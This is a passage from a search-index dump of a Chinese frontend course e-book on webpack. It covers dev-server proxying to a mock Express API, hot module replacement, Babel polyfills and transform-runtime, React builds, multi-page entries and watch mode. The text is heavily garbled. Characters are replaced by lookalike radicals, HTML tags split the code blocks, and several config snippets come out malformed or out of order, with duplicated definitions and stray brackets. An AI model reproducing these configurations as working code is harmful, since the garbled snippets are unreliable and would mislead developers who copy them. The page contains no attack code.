\u591a\u2f45\u65b9\u4ecb\u2f0a  \u591a\u2f45\u65b9\u7ed9\u51fa\u2f47\u65e5\u671f UI\u7ed9\u51fa\u7684\u2f47\u65e5\u671f=\u4f60\u5f00\u59cbcoding\u7684\u65f6\u95f4\u70b9 \u670d\u52a1\u7aef\u7684\u63a5\u2f1d\u53e3</p> <pre><code>\u6709\u591a\u5c11\u4e2a\u2eda\u9875\u2faf\u9762\n\u63a5\u2f1d\u53e3\u6570\u91cf\uf97e\n\u5b57\u6bb5\n\u7ed9\u51fa\u63a5\u2f1d\u53e3\u2f42\u6587\u6863\u65f6\u95f4\u70b9\ndevServer: {\n    contentBase: \"./dist\",\n    open: true,\n    port: 8081\n</code></pre> <p>},</p> <p>mock\u6570\u636e</p> <p>\u662f\u5426\u6709\u5b57\u6bb5\u7684\u53d8\u5316 \u63a5\u2f1d\u53e3\u7684\u53d8\u5316 \u2f00\u5b9a\u8981\u540c\u6b65</p> <p>\u6210\u2f74\u7acb\u9879\u2f6c\u76ee\u7ec4</p> <p>\u2f24\u5927\u5bb6\u5750\u5728\u2f00\u5757</p> <p>\u8054\u8c03\u671f\u95f4\uff0c\u524d\u540e\u7aef\u5206\u79bb\uff0c\u76f4\u63a5\u83b7\u53d6\u6570\u636e\u4f1a\u8de8\u57df\uff0c\u4e0a\u7ebf\u540e\u6211\u4eec\u4f7f\u2f64nginx\u8f6c\u53d1\uff0c\u5f00\u53d1\u671f\u95f4\uff0cwebpack\u5c31\u53ef \u4ee5\u641e\u5b9a\u8fd9\u4ef6\u4e8b</p> <p>\u542f\u52a8\u2f00\u4e2a\u670d\u52a1\u5668\ufa38\uff0cmock\u2f00\u4e2a\u63a5\u2f1d\u53e3:</p> <p>\u9879\u2f6c\u76ee\u4e2d\u5b89\u88c5axios\u2f2f\u5de5\u5177</p> <p>// npm i express -D  // \u521b\u5efa\u2f00\u4e2aserver.js \u4fee\u6539scripts \"server\":\"node server.js\"</p> <p>//server.js</p> <pre><code>const express = require('express')\nconst app = express()\napp.get('/api/info', (req,res)=&gt;{\n    res.json({\n</code></pre> <p>name:'\u5f00\u8bfe\u5427',  age:5, msg:'\u6b22\u8fce\u6765\u5230\u5f00\u8bfe\u5427\u5b66\u4e60\u524d\u7aef\u2fbc\u9ad8\u7ea7\u8bfe\u7a0b'</p> <p>}) })</p> <pre><code>app.listen('9092')\n//node server.js\nhttp://localhost:9092/api/info\n//npm i axios -D\n</code></pre> <p>//index.js</p> <pre><code>import axios from 'axios'\naxios.get('http://localhost:9092/api/info').then(res=&gt;{\n    console.log(res)\n})\n</code></pre> <p>\u4f1a\u6709\u8de8\u57df\u95ee\u9898</p> <p>\u4fee\u6539webpack.config.js \u8bbe\u7f6e\u670d\u52a1\u5668\ufa38\u4ee3\u7406\uf9e4</p> <pre><code>proxy: {\n      \"/api\": {\n        target: \"http://localhost:9092\"\n      }\n</code></pre> <p>}</p> <p>\u4fee\u6539index.js</p> <p>Hot Module Replacement (HMR:\u70ed\u6a21\u5757\u66ff\u6362) \u4e0d\uf967\u2f40\u652f\u6301\u62bd\u79bb\u51fa\u7684css \u6211\u4eec\u8981\u4f7f\u2f64css-loader</p> <p>\u542f\u52a8hmr</p> <pre><code>axios.get(\"/api/info\").then(res =&gt; {\n  console.log(res);\n</code></pre> <p>});</p> <p>devServer: {  contentBase: \"./dist\",  open: true,  hot:true, //\u5373\u4fbf\uf965HMR\u4e0d\uf967\u2f63\u6548\uff0c\u6d4f\u89c8\u5668\ufa38\u4e5f\u4e0d\uf967\u2f83\u81ea\u52a8\u5237\u65b0\uff0c\u5c31\u5f00\u542fhotOnly hotOnly:true</p> <p>},</p> <p>\u914d\u7f6e\u2f42\u6587\u4ef6\u5934\u90e8\u5f15\u2f0awebpack</p> <pre><code>//const path = require(\"path\");\n//const HtmlWebpackPlugin = require(\"html-webpack-plugin\");\n//const CleanWebpackPlugin = require(\"clean-webpack-plugin\");\nconst webpack = require(\"webpack\");\n</code></pre> <p>\u5728\u63d2\u4ef6\u914d\u7f6e\u5904\u6dfb\u52a0:</p> <pre><code>plugins: [\n    new CleanWebpackPlugin(),\n    new HtmlWebpackPlugin({\n      template: \"src/index.html\"\n    }),\n    new webpack.HotModuleReplacementPlugin()\n  ],\n</code></pre> <p>\u6848\u4f8b:</p> <p>//index.js</p> <pre><code>import \"./css/index.css\";\n\n\nvar btn = document.createElement(\"button\"); btn.innerHTML = \"\u65b0\u589e\"; document.body.appendChild(btn);\n\nbtn.onclick = function() {\n  var div = document.createElement(\"div\");\n  div.innerHTML = \"item\";\n  document.body.appendChild(div);\n};\n</code></pre> <p>//index.css</p> <pre><code>div:nth-of-type(odd) {\n  background: yellow;\n</code></pre> <p>}</p> <p>\u6ce8\u610f\u542f\u52a8HMR\u540e\uff0ccss\u62bd\u79bb\u4f1a\u4e0d\uf967\u2f63\u6548\uff0c\u8fd8\u6709\u4e0d\uf967\u2f40\u652f\u6301contenthash\uff0cchunkhash</p> <p>\u5904\u7406\uf9e4js\u6a21\u5757HMR \u9700\u8981\u4f7f\u2f64module.hot.accept\u6765\u89c2\u5bdf\u6a21\u5757\u66f4\uf901\u65b0 \u4ece\u2f7d\u800c\u66f4\uf901\u65b0</p> <p>\u6848\u4f8b:</p> <pre><code>//counter.js\nfunction counter() {\n  var div = document.createElement(\"div\");\n  div.setAttribute(\"id\", \"counter\");\n  div.innerHTML = 1;\n  div.onclick = function() {\ndiv.innerHTML = parseInt(div.innerHTML, 10) + 1;\n\n};\n\n  document.body.appendChild(div);\n}\nexport default counter;\n</code></pre> <p>//number.js</p> <pre><code>function number() {\n  var div = document.createElement(\"div\");\n  div.setAttribute(\"id\", \"number\");\n  div.innerHTML = 13000;\n  document.body.appendChild(div);\n}\nexport default number;\n</code></pre> <p>//index.js</p> <pre><code>import counter from \"./counter\";\nimport number from \"./number\";\ncounter();\nnumber();\nif (module.hot) {\n  module.hot.accept(\"./b\", function() {\n    document.body.removeChild(document.getElementById(\"number\"));\n    number();\n  });\n</code></pre> <p>}</p>"},{"location":"ebook-kaikeba-frontend/14-webpack-03/#babeles6","title":"Babel\u5904\u7406\uf9e4ES6","text":"<p>\u5b98\u2f45\u65b9\u2f79\u7f51\u7ad9:https://babeljs.io/ \u4e2d\u2f42\u6587\u2f79\u7f51\u7ad9:https://www.babeljs.cn/</p> <p>Babel\u662fJavaScript\u7f16\u8bd1\u5668\ufa38\uff0c\u80fd\u5c06ES6\u4ee3\u7801\u8f6c\u6362\u6210ES5\u4ee3\u7801\uff0c\u8ba9\u6211\u4eec\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u653e\u2f3c\u5fc3\u4f7f\u2f64JS\u65b0\u7279\u6027\u2f7d\u800c\u4e0d\uf967\u2f64\u62c5 \u2f3c\u5fc3\u517c\u5bb9\u6027\u95ee\u9898\u3002\u5e76\u4e14\u8fd8\u53ef\u4ee5\u901a\u8fc7\u63d2\u4ef6\u673a\u5236\u6839\u636e\u9700\u6c42\u7075\u6d3b\u7684\u6269\u5c55\u3002</p> <p>Babel\u5728\u6267\u2f8f\u884c\ufa08\u7f16\u8bd1\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u4ece\u9879\u2f6c\u76ee\u6839\u2f6c\u76ee\u5f55\u4e0b\u7684 .babelrc JSON\u2f42\u6587\u4ef6\u4e2d\u8bfb\u53d6\u914d\u7f6e\u3002\u6ca1\u6709\u8be5\u2f42\u6587\u4ef6\u4f1a\u4ece loader\u7684options\u5730\u2f45\u65b9\u8bfb\u53d6\u914d\u7f6e\u3002</p> <p>\u6d4b\u8bd5\u4ee3\u7801</p> <p>//index.js</p> <pre><code>const arr = [new Promise(() =&gt; {}), new Promise(() =&gt; {})];\narr.map(item =&gt; {\n  console.log(item);\n</code></pre> <p>});</p> <p>\u5b89\u88c5</p> <p>npm i babel-loader @babel/core @babel/preset-env -D  1.babel-loader\u662fwebpack \u4e0e babel\u7684\u901a\u4fe1\u6865\u6881\uf97a\uff0c\u4e0d\uf967\u4f1a\u505a\u628aes6\u8f6c\u6210es5\u7684\u2f2f\u5de5\u4f5c\uff0c\u8fd9\u90e8\u5206\u2f2f\u5de5\u4f5c\u9700\u8981\u2f64\u5230</p> <p>@babel/preset-env\u6765\u505a 2.@babel/preset-env\u2fa5\u91cc\uf9e9\u5305\u542b\u4e86\uf9baes\uff0c6\uff0c7\uff0c8\u8f6ces5\u7684\u8f6c\u6362\u89c4\u5219</p> <p>Ecma 5 6 7 8... \u8349\u6848(\u8bc4\u5ba1\u901a\u8fc7\u7684\uff0c\u8fd8\u6709\u672a\u901a\u8fc7\u7684) \u2faf\u9762\u5411\u672a\u6765\u7684  env\u662fbabel7\u4e4b\u540e\u63a8\u2f8f\u884c\ufa08\u7684\u9884\u8bbe\u63d2\u4ef6  env{</p> <p>ecma 5 ecma 6 ecma 7 ecma 8 \u3002\u3002\u3002 }</p> <p>Webpack.config.js</p> <pre><code>{\n  test: /\\.js$/,\n  exclude: /node_modules/,\n  use: {\n    loader: \"babel-loader\",\n    options: {\n      presets: [\"@babel/preset-env\"]\n    }\n</code></pre> <p>} }</p> <p>\u901a\u8fc7\u4e0a\u2faf\u9762\u7684\u2f0f\u51e0\u6b65 \u8fd8\u4e0d\uf967\u591f\uff0c\u9ed8\u8ba4\u7684Babel\u53ea\u2f40\u652f\u6301let\u7b49\u2f00\u4e9b\u57fa\u7840\u7684\u7279\u6027\u8f6c\u6362\uff0cPromise\u7b49\u2f00\u4e9b\u8fd8\u6709\u8f6c\u6362\u8fc7 \u6765\uff0c\u8fd9\u65f6\u5019\u9700\u8981\u501f\u52a9@babel/polyfill\uff0c\u628aes\u7684\u65b0\u7279\u6027\u90fd\u88c5\u8fdb\u6765\uff0c\u6765\u5f25\u8865\u4f4e\u7248\u672c\u6d4f\u89c8\u5668\ufa38\u4e2d\u7f3a\u5931\u7684\u7279\u6027</p> <p>@babel/polyfill</p> <p>\u4ee5\u5168\u5c40\u53d8\u91cf\uf97e\u7684\u2f45\u65b9\u5f0f\u6ce8\u2f0a\u8fdb\u6765\u7684\u3002windows.Promise\uff0c\u5b83\u4f1a\u9020\u6210\u5168\u5c40\u5bf9\u8c61\u7684\u6c61\u67d3 npm install --save @babel/polyfill</p> <p>//index.js \u9876\u90e8  import \"@babel/polyfill\";</p> <p>\u6309\u9700\u52a0\u8f7d\uff0c\u51cf\u5c11\u5197\u4f59</p> <p>\u4f1a\u53d1\u73b0\u6253\u5305\u7684\u4f53\u79ef\u2f24\u5927\u4e86\uf9ba\u5f88\u591a\uff0c\u8fd9\u662f\u56e0\u4e3apolyfill\u9ed8\u8ba4\u4f1a\u628a\u6240\u6709\u7279\u6027\u6ce8\u2f0a\u8fdb\u6765\uff0c\u5047\u5982\u6211\u60f3\u6211\u2f64\u5230\u7684es6+\uff0c\u624d \u4f1a\u6ce8\u2f0a\uff0c\u6ca1\u2f64\u5230\u7684\u4e0d\uf967\u6ce8\u2f0a\uff0c\u4ece\u2f7d\u800c\u51cf\u5c11\u6253\u5305\u7684\u4f53\u79ef\uff0c\u53ef\u4e0d\uf967\u53ef\u4ee5\u5462</p> <p>\u5f53\u7136\u53ef\u4ee5 \u4fee\u6539Webpack.config.js</p> <p>options: {  [</p> <p>presets: [</p> <p>} ]</p> <p>] }</p> <pre><code>\"@babel/preset-env\",\n{\n  targets: {\n    edge: \"17\",\n    firefox: \"60\",\n    chrome: \"67\",\n    safari: \"11.1\"\n</code></pre> <p>},  corejs: 2,//\u65b0\u7248\u672c\u9700\u8981\u6307\u5b9a\u6838\u2f3c\u5fc3\u5e93\u7248\u672c useBuiltIns: \"entry\"//\u6309\u9700\u6ce8\u2f0a</p> <p>useBuiltIns \u9009\u9879\u662f babel 7 \u7684\u65b0\u529f\u80fd\uff0c\u8fd9\u4e2a\u9009\u9879\u544a\u8bc9 babel \u5982\u4f55\u914d\u7f6e @babel/polyfill \u3002 \u5b83\u6709\u4e09 \u4e2a\u53c2\u6570\u53ef\u4ee5\u4f7f\u2f64: 1entry: \u9700\u8981\u5728 webpack \u7684\u2f0a\u53e3\u2f42\u6587\u4ef6\u2fa5\u91cc\uf9e9 import \"@babel/polyfill\" \u2f00  \u6b21\u3002 babel \u4f1a\u6839\u636e\u4f60\u7684\u4f7f\u2f64\u60c5\u51b5\u5bfc\u2f0a\u57ab\u2f5a\u7247\uff0c\u6ca1\u6709\u4f7f\u2f64\u7684\u529f\u80fd\u4e0d\uf967\u4f1a\u88ab\u5bfc\u2f0a\u76f8\u5e94\u7684\u57ab\u2f5a\u7247\u3002 2usage: \u4e0d\uf967\u9700\u8981</p> <p>import \uff0c\u5168\u2f83\u81ea\u52a8\u68c0\u6d4b\uff0c\u4f46\u662f\u8981\u5b89\u88c5 @babel/polyfill \u3002(\u8bd5\u9a8c\u9636\u6bb5) 3false: \u5982\u679c\u4f60 import \"@babel/polyfill\" \uff0c\u5b83\u4e0d\uf967\u4f1a\u6392\u9664\u6389\u6ca1\u6709\u4f7f\u2f64\u7684\u57ab\u2f5a\u7247\uff0c\u7a0b\u5e8f\u4f53\u79ef\u4f1a\u5e9e\u2f24\u5927\u3002(\u4e0d\uf967\u63a8\u8350)</p> <p>\u8bf7\u6ce8\u610f: usage \u7684\u2f8f\u884c\ufa08\u4e3a\u7c7b\u4f3c babel-transform-runtime\uff0c\u4e0d\uf967\u4f1a\u9020\u6210\u5168\u5c40\u6c61\u67d3\uff0c\u56e0\u6b64\u4e5f\u4f1a\u4e0d\uf967\u4f1a\u5bf9\u7c7b\u4f3c Array.prototype.includes() \u8fdb\u2f8f\u884c\ufa08 polyfill\u3002</p> <p>\u6269\u5c55:  babelrc\u2f42\u6587\u4ef6: \u65b0\u5efa.babelrc\u2f42\u6587\u4ef6\uff0c\u628aoptions\u90e8\u5206\u79fb\u2f0a\u5230\u8be5\u2f42\u6587\u4ef6\u4e2d\uff0c\u5c31\u53ef\u4ee5\u4e86\uf9ba</p> <p>//.babelrc</p> <pre><code>{\n presets: [\n\n\n    [\n      \"@babel/preset-env\",\n      {\n        targets: {\n          edge: \"17\",\n          firefox: \"60\",\n          chrome: \"67\",\n          safari: \"11.1\"\n\n\n},\n corejs: 2, //\u65b0\u7248\u672c\u9700\u8981\u6307\u5b9a\u6838\u2f3c\u5fc3\u5e93\u7248\u672c useBuiltIns: \"usage\" //\u6309\u9700\u6ce8\u2f0a\n\n} ]\n\n] }\n</code></pre> <pre><code>//webpack.config.js\n{\n  test: /\\.js$/,\n  exclude: /node_modules/,\n  loader: \"babel-loader\"\n</code></pre> <p>}</p>"},{"location":"ebook-kaikeba-frontend/14-webpack-03/#react_1","title":"\u914d\u7f6eReact\u6253\u5305\u73af\u5883 \u5b89\u88c5","text":"<pre><code>  npm install react react-dom --save\n</code></pre> <p>\u7f16\u5199react\u4ee3\u7801:</p> <p>//index.js</p> <pre><code>import React, { Component } from \"react\";\nimport ReactDom from \"react-dom\";\nclass App extends Component {\n  render() {\n    return &lt;div&gt;hello world&lt;/div&gt;;\n  }\n}\nReactDom.render(&lt;App /&gt;, document.getElementById(\"app\"));\n</code></pre> <p>\u5b89\u88c5babel\u4e0ereact\u8f6c\u6362\u7684\u63d2\u4ef6:  npm install --save-dev @babel/preset-react</p> <p>\u5728babelrc\u2f42\u6587\u4ef6\u2fa5\u91cc\uf9e9\u6dfb\u52a0:</p> <p><pre><code>{\n  \"presets\": [\n    [\n      \"@babel/preset-env\",\n      {\n        \"targets\": {\n          \"edge\": \"17\",\n          \"firefox\": \"60\",\n          \"chrome\": \"67\",\n          \"safari\": \"11.1\",\n          \"Android\":\"6.0\"\n},\n\n\"useBuiltIns\": \"usage\", //\u6309\u9700\u6ce8\u2f0a }\n\n],\n\n\n    \"@babel/preset-react\"\n\n\n]\n\n\n\n}\n</code></pre> \u5982\u679c\u662f\u5e93\u7684\u4f5c\u8005\u7684\u8bdd\uff0c\u63d0\u4f9b\u6a21\u5757\u7684\u65f6\u5019\u4ee3\u7801\u600e\u4e48\u6253\u5305\u7684? \u6784\u5efa\u901f\u5ea6\u4f1a\u8d8a\u6765\u8d8a\u6162\uff0c\u600e\u4e48\u4f18\u5316 \u6269\u5c55: \u591a\u2eda\u9875\u2faf\u9762\u6253\u5305\u901a\u2f64\u2f45\u65b9\u6848 entry:{   index:\"./src/index\",   list:\"./src/list\",   detail:\"./src/detail\" <pre><code>}\n\n```json\nnew htmlWebpackPlugins({\n  title: \"index.html\",\n  template: path.join(__dirname, \"./src/index/index.html\"),\n  filename:\"index.html\",\n  chunks:[index]\n</code></pre></p> <p>})</p> <p>1.\u2f6c\u76ee\u5f55\u7ed3\u6784\u8c03\u6574 src</p> <p>index</p> <p>index.js</p> <p>index.html list</p> <p>index.js</p> <p>index.html detail</p> <p>index.js</p> <p>index.html  2.\u4f7f\u2f64 glob.sync \u7b2c\u4e09\u2f45\u65b9\u5e93\u6765\u5339\u914d\u8def\uf937\u5f84</p> <pre><code>npm i glob -D\nconst glob = require(\"glob\")\n</code></pre> <p>//MPA\u591a\u2eda\u9875\u2faf\u9762\u6253\u5305\u901a\u2f64\u2f45\u65b9\u6848</p> <pre><code>const setMPA = () =&gt; {\n  const entry = {};\n  const htmlWebpackPlugins = [];\n  return {\n    entry,\n    htmlWebpackPlugins\n</code></pre> <p>}; };</p> <pre><code>const { entry, htmlWebpackPlugins } = setMPA();\nconst setMPA = () =&gt; {\n  const entry = {};\n  const htmlWebpackPlugins = [];\n  const entryFiles = glob.sync(path.join(__dirname, \"./src/*/index.js\"));\n  entryFiles.map((item, index) =&gt; {\n    const entryFile = entryFiles[index];\n    const match = entryFile.match(/src\\/(.*)\\/index\\.js$/);\n    const pageName = match &amp;&amp; match[1];\n    entry[pageName] = entryFile;\n    htmlWebpackPlugins.push(\n      new htmlWebpackPlugin({\n        title: pageName,\n        template: path.join(__dirname, `src/${pageName}/index.html`),\n        filename: `${pageName}.html`,\n        chunks: [pageName],\n        inject: true\n\n\n}) );\n\n}); return {\n\nentry,\n\n\n    htmlWebpackPlugins\n\n\n}; };\n\n\nconst { entry, htmlWebpackPlugins } = setMPA();\n\n\n\n\n```js\nmodule.exports = {\n  entry,\n  output:{\n    path: path.resolve(__dirname, \"./dist\"),\n    filename: \"[name].js\"\n}\n plugins: [\n\n// ...\n\n...htmlWebpackPlugins//\u5c55\u5f00\u6570\u7ec4 ]\n\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/14-webpack-03/#hash-chunkhash-contenthash-3","title":"Hash chunkhash contenthash 3\u8005\u7684\u533a\u522b","text":"<p>main-1d9cc22e</p> <p>\u6269\u5c55</p> <p>@babel/plugin-transform-runtime</p> <p>\u5f53\u6211\u4eec\u5f00\u53d1\u7684\u662f\u7ec4\u4ef6\u5e93\uff0c\u2f2f\u5de5\u5177\u5e93\u8fd9\u4e9b\u573a\u666f\u7684\u65f6\u5019\uff0cpolyfill\u5c31\u4e0d\uf967\u9002\u5408\u4e86\uf9ba\uff0c\u56e0\u4e3apolyfill\u662f\u6ce8\u2f0a\u5230\u5168\u5c40\u53d8\u91cf\uf97e\uff0c window\u4e0b\u7684\uff0c\u4f1a\u6c61\u67d3\u5168\u5c40\u73af\u5883\uff0c\u6240\u4ee5\u63a8\u8350\u95ed\u5305\u2f45\u65b9\u5f0f:@babel/plugin-transform-runtime\uff0c\u5b83\u4e0d\uf967\u4f1a\u9020 \u6210\u5168\u5c40\u6c61\u67d3</p> <p>\u5b89\u88c5</p> <p>\u4fee\u6539\u914d\u7f6e\u2f42\u6587\u4ef6:\u6ce8\u91ca\u6389\u4e4b\u524d\u7684presets\uff0c\u6dfb\u52a0plugins</p> <pre><code>npm install --save-dev @babel/plugin-transform-runtime\nnpm install --save @babel/runtime\noptions: {\n    presets: [\n</code></pre> <p>[</p> <pre><code>      \"@babel/preset-env\",\n      {\n        targets: {\n          edge: \"17\",\n          firefox: \"60\",\n          chrome: \"67\",\n          safari: \"11.1\"\n        },\n        useBuiltIns: \"usage\",\n        corejs: 2\n</code></pre> <p>} ]</p> <pre><code>  ],\n\"plugins\": [\n    [\n      \"@babel/plugin-transform-runtime\",\n      {\n        \"absoluteRuntime\": false,\n        \"corejs\": false,\n        \"helpers\": true,\n        \"regenerator\": true,\n        \"useESModules\": false\n</code></pre> <p>} ]</p> <p>] }</p> <p>\u2f42\u6587\u4ef6\u76d1\u542c</p> <p>\u8f6e\u8be2\u5224\u65ad\u2f42\u6587\u4ef6\u7684\u6700\u540e\u7f16\u8f91\u65f6\u95f4\u662f\u5426\u53d8\u5316\uff0c\u67d0\u4e2a\u2f42\u6587\u4ef6\u53d1\u2f63\u4e86\uf9ba\u53d8\u5316\uff0c\u5e76\u4e0d\uf967\u4f1a\u2f74\u7acb\u523b\u544a\u8bc9\u76d1\u542c\u8005\uff0c\u5148\u7f13\u5b58\u8d77\u6765 webpack\u5f00\u542f\u76d1\u542c\u6a21\u5f0f\uff0c\u6709\u4e24\u79cd</p> <p>1.\u542f\u52a8webpack\u547d\u4ee4\u5f0f \u5e26\u4e0a--watch \u53c2\u6570\uff0c\u542f\u52a8\u76d1\u542c\u540e\uff0c\u9700\u8981\u2f3f\u624b\u52a8\u5237\u65b0\u6d4f\u89c8\u5668\ufa38</p> <pre><code>scripts:{\n    \"watch\":\"webpack --watch\"\n</code></pre> <p>}</p> <p>2.\u5728\u914d\u7f6e\u2f42\u6587\u4ef6\u2fa5\u91cc\uf9e9\u8bbe\u7f6e watch:true</p> <p>watch: true, //\u9ed8\u8ba4false,\u4e0d\uf967\u5f00\u542f //\u914d\u5408watch,\u53ea\u6709\u5f00\u542f\u624d\u6709\u4f5c\u2f64 watchOptions: {</p> <p>//\u9ed8\u8ba4\u4e3a\u7a7a\uff0c\u4e0d\uf967\u76d1\u542c\u7684\u2f42\u6587\u4ef6\u6216\u8005\u2f6c\u76ee\u5f55\uff0c\u2f40\u652f\u6301\u6b63\u5219 ignored: /node_modules/,</p> <p>//\u76d1\u542c\u5230\u2f42\u6587\u4ef6\u53d8\u5316\u540e\uff0c\u7b49300ms\u518d\u53bb\u6267\u2f8f\u884c\ufa08\uff0c\u9ed8\u8ba4300ms,  aggregateTimeout: 300, //\u5224\u65ad\u2f42\u6587\u4ef6\u662f\u5426\u53d1\u2f63\u53d8\u5316\u662f\u901a\u8fc7\u4e0d\uf967\u505c\u7684\u8be2\u95ee\u7cfb\u7edf\u6307\u5b9a\u2f42\u6587\u4ef6\u6709\u6ca1\u6709\u53d8\u5316\uff0c\u9ed8\u8ba4\u6bcf\u79d2\u95ee1\u6b21 poll: 1000 //ms</p> <p>}</p> <p>\u8f6e\u8be2 1s\u67e5\u770b1\u6b21</p>"},{"location":"ebook-kaikeba-frontend/15-webpack%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/","title":"\u7b2c\u56db\u8282 react-webpack \u914d\u7f6e\u4f18\u53161","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 7350  \u9605\u8bfb15\u5206\u949f</p> <p>\u4ee5\u8003\u4ee3\u7ec3\uff082021-10-28\uff09</p> <ol> <li>webpack \u6709\u51e0\u4e2a\u4f18\u5316\u914d\u7f6e\u9879\uff086\u4e2a\u9ed8\u5199\uff09\uff0c\u5177\u4f53\u4f5c\u7528\uff0c\u600e\u4e48\u914d\u7f6e\uff0c\u6709\u6ca1\u6709\u526f\u4f5c\u7528\uff08\u7b80\u8ff0\uff09\uff1f</li> <li>CSS \u5982\u4f55\u8fdb\u884c\u4f18\u5316\uff084\u70b9\u9ed8\u5199\uff09\u751f\u4ea7\u73af\u5883\u548c\u5f00\u53d1\u73af\u5883\u5206\u522b\u4f7f\u7528\u54ea\u4e9b\u4f18\u5316\uff1f</li> <li>\u4e0d\u540c\u73af\u5883\u5982\u4f55\u4f7f\u7528\u4e0d\u540c\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u9700\u8981\u54ea\u4e9b\u5e93\uff082\u4e2a\uff09\uff0c\u5206\u522b\u662f\u4ec0\u4e48\u4f5c\u7528\uff1f</li> </ol>"},{"location":"ebook-kaikeba-frontend/15-webpack%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/#_1","title":"\u4f18\u5316\u914d\u7f6e","text":""},{"location":"ebook-kaikeba-frontend/15-webpack%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/#include","title":"Include \u7f29\u5c0f\u6587\u4ef6\u8303\u56f4","text":"<p>loader \u4f1a\u5339\u914d\u5168\u90e8\u7684\u6587\u4ef6\uff0c\u904d\u5386\u4e0d\u5fc5\u8981\u7684\u6587\u4ef6\u65f6\uff0c\u9020\u6210\u6027\u80fd\u635f\u8017</p> <p>\u4f7f\u7528 test include exclude \u914d\u7f6e\u9879\uff0c\u7f29\u5c0f loader \u7684\u5904\u7406\u8303\u56f4</p> <pre><code>include: path.resolve(__dirname, \"./src\"),\nexclude: \"/node_modules/\",\n</code></pre> <p>\u53ef\u4ee5\u5728\u6bcf\u4e00\u4e2a loader \u4e0a\u90fd\u8bbe\u7f6e includes \u7f29\u5c0f\u6587\u4ef6\u8303\u56f4</p>"},{"location":"ebook-kaikeba-frontend/15-webpack%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/#resolvemodules","title":"\u4f18\u5316 resolve.modules","text":"<p>Resolve.modules \u7528\u4e8e webpack \u5728\u4ec0\u4e48\u76ee\u5f55\u4e0b\u9762\u67e5\u627e\u7b2c\u4e09\u65b9\u6a21\u5757\u3002\u5982\u679c\u5728\u5f53\u524d\u7684\u76ee\u5f55\u4e2d\u6ca1\u6709\u627e\u5230\uff0c\u90a3\u4e48\u4f1a\u5411\u4e0a\u7ea7\u76ee\u5f55\u9012\u5f52\u67e5\u627e\uff0c\u8fd9\u6837\u76f8\u5bf9\u8017\u65f6\u3002\u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u8bbe\u7f6e\u8def\u5f84\u3002</p> <pre><code>module.exports = {\n  resolve: {\n    modules: [path.resolve(__dirname, \"./node_modules\")]\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/15-webpack%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/#resolvealias","title":"\u4f18\u5316 resolve.alias","text":"<p>\u901a\u5e38\u8bed\u6cd5\u662f <code>import react from 'react'</code> \uff0c\u8fd9\u4e2a\u4f1a\u4ece react \u4e2d\u67e5\u627e index.js \u5728\u4ec0\u4e48\u4f4d\u7f6e\u3002</p> <p>Resolve.alias \u53ef\u4ee5\u5c06\u539f\u6765\u7684\u8def\u5f84\uff0c\u6620\u5c04\u6210\u4e00\u4e2a\u76f4\u63a5\u5bfc\u5165\u8def\u5f84\uff0c\u52a0\u5feb\u8bfb\u53d6\u5305\u7684\u901f\u5ea6\u3002</p> <p>react \u4e2d\u6709\u4e24\u5957\u89c4\u8303\u7684\u4ee3\u7801 cjs \u548c umd \u4e0d\u540c\u7684\u6a21\u5757\u5316\u7684\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u6307\u5b9a\u9700\u8981\u7684\u6587\u4ef6\u3002</p> <p>\u4f8b\u5b50</p> <pre><code>module.exports = {\n  resolve: {\n    alias: {\n      \"@\": [path.resolve(__dirname, \"./node_modules/css\")],\n      react: \"./node_modules/react/umd\"\n    }\n  }\n}\n</code></pre> <p>\u4e3b\u8981\u6d88\u8017\u65f6\u95f4\u662f loader\uff0c\u8fd9\u90e8\u5206\u6d88\u8017\u65f6\u95f4\u8f83\u5c11\uff0c\u4f18\u5316\u6548\u679c\u4e0d\u660e\u663e</p> <p>\u5b9e\u9645\u9879\u76ee\u4e2d\uff0c\u5982\u679c\u4e00\u4e2a\u53f6\u5b50\u8282\u70b9\uff0c\u5f15\u7528\u53e6\u4e00\u4e2a\u53f6\u5b50\u8282\u70b9\uff0c\u90a3\u4e48\u5c31\u662f <code>import xxx from '../../../../utils</code> \u8fd9\u6837\u5199\uff0c\u5982\u679c\u6539\u52a8\u6587\u4ef6\u7684\u76f8\u5bf9\u4f4d\u7f6e\uff0c\u7ef4\u62a4\u8d77\u6765\u5f88\u9ebb\u70e6\uff0c\u90a3\u4e48\u5c31\u4f7f\u7528 alias \u8fdb\u884c\u8def\u5f84\u7b80\u5316\uff0c\u76f4\u63a5\u5199\u6210 <code>import xxx from '@/utils</code> \u5373\u53ef\u5f15\u5165\uff0c\u8fd9\u4e2a\u7ec4\u4ef6\u7684\u4f4d\u7f6e\u79fb\u52a8\u540e\uff0c\u4e5f\u4e0d\u9700\u8981\u518d\u66f4\u6539\u8fd9\u4e2a\u8def\u5f84</p> <p>\u53ef\u80fd\u7684\u95ee\u9898\uff1a\u6709\u7684\u9879\u76ee\u7f16\u8bd1\u65f6\uff0c\u663e\u793a <code>path.resolve(__dirname, \"src\")</code> \u4f1a\u62a5\u9519\uff0c\u5f15\u5165\u7684\u6587\u4ef6\u5728 src \u5916\u90e8\uff0c\u90a3\u4e48\u53ef\u4ee5\u4f7f\u7528 <code>path.resolve(process.cwd(), 'src')</code> \u8fd9\u6837\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528.</p> <p><code>__dirname process.cwd()</code> \u7684\u533a\u522b\u53c2\u8003 https://www.cnblogs.com/yky-iris/p/8617765.html</p> <p><code>__dirname</code> \u8868\u793a\u6a21\u5757\u7684\u76ee\u5f55\u540d\uff0c<code>process.cwd()</code> \u8868\u793a\u5f53\u524d\u8fdb\u7a0b\u6267\u884c\u7684\u8def\u5f84\u540d\u3002\u8fd9\u4e2a\u662f\u5426\u548c webpack 